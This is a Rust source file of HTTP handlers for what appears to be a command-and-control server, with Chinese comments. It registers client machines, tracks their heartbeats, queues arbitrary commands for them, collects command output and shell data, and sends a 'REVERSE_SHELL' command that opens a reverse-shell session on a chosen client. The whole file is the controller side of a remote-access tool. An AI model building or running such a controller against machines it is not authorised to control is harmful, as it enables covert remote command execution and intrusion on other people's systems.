use axum::{
    Json,
    extract::{Path, State},
    http::StatusCode,
};
use common::*;
use crate::state::ServerState;

/// 客户端注册
pub async fn register_client(
    State(state): State<ServerState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        let mut clients = state.clients.write().await;
        clients.insert(client_info.id.clone(), client_info);
        println!("Client registered: {}", clients.len());
        Ok(StatusCode::OK)
    } else {
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 心跳处理
pub async fn handle_heartbeat(
    State(state): State<ServerState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(mut client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        client_info.last_seen = chrono::Utc::now();
        let mut clients = state.clients.write().await;
        clients.insert(client_info.id.clone(), client_info);
        Ok(StatusCode::OK)
    } else {
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 获取客户端命令
pub async fn get_commands(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
) -> Result<Json<Vec<CommandRequest>>, StatusCode> {
    let mut commands = state.commands.write().await;
    let client_commands = commands.remove(&client_id).unwrap_or_default();
    Ok(Json(client_commands))
}

/// 接收命令结果
pub async fn handle_command_result(
    State(state): State<ServerState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(result) = serde_json::from_slice::<CommandResponse>(&message.payload) {
        let mut results = state.command_results.write().await;
        results
            .entry(result.client_id.clone())
            .or_insert_with(Vec::new)
            .push(result);
        Ok(StatusCode::OK)
    } else {
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 处理Shell数据
pub async fn handle_shell_data(
    State(_state): State<ServerState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(shell_data) = serde_json::from_slice::<ShellData>(&message.payload) {
        // 这里可以实现Shell数据的处理和转发
        println!("Received shell data from {}: {} bytes", 
                shell_data.session_id, shell_data.data.len());
        
        // 可以在这里添加实时转发给Web界面的逻辑
        // 比如通过WebSocket发送给前端
        
        Ok(StatusCode::OK)
    } else {
        println!("Received shell data: {} bytes", message.payload.len());
        Ok(StatusCode::OK)
    }
}

/// 发送命令到客户端
pub async fn send_command(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
    Json(mut cmd): Json<CommandRequest>,
) -> Result<StatusCode, StatusCode> {
    cmd.client_id = client_id.clone();

    let mut commands = state.commands.write().await;
    commands.entry(client_id).or_insert_with(Vec::new).push(cmd);

    Ok(StatusCode::OK)
}

/// 获取客户端列表API
pub async fn api_clients(State(state): State<ServerState>) -> Json<Vec<ClientInfo>> {
    let clients = state.clients.read().await;
    let clients_vec: Vec<ClientInfo> = clients.values().cloned().collect();
    Json(clients_vec)
}

/// 获取命令结果API
pub async fn api_command_results(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
) -> Json<Vec<CommandResponse>> {
    let command_results = state.command_results.read().await;
    let results = command_results.get(&client_id).cloned().unwrap_or_default();
    Json(results)
}

/// 启动反弹Shell
pub async fn initiate_reverse_shell(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
) -> Result<StatusCode, StatusCode> {
    // 创建反弹Shell会话
    let session_id = uuid::Uuid::new_v4().to_string();
    let shell_session = ShellSession {
        client_id: client_id.clone(),
        session_id: session_id.clone(),
        created_at: chrono::Utc::now(),
        is_active: true,
    };

    // 保存Shell会话
    {
        let mut sessions = state.shell_sessions.write().await;
        sessions.insert(session_id.clone(), shell_session);
    }

    // 发送反弹Shell命令到客户端
    let command = CommandRequest {
        client_id: client_id.clone(),
        command: "REVERSE_SHELL".to_string(),
        args: vec![session_id],
    };

    let mut commands = state.commands.write().await;
    commands
        .entry(client_id)
        .or_insert_with(Vec::new)
        .push(command);

    Ok(StatusCode::OK)
}
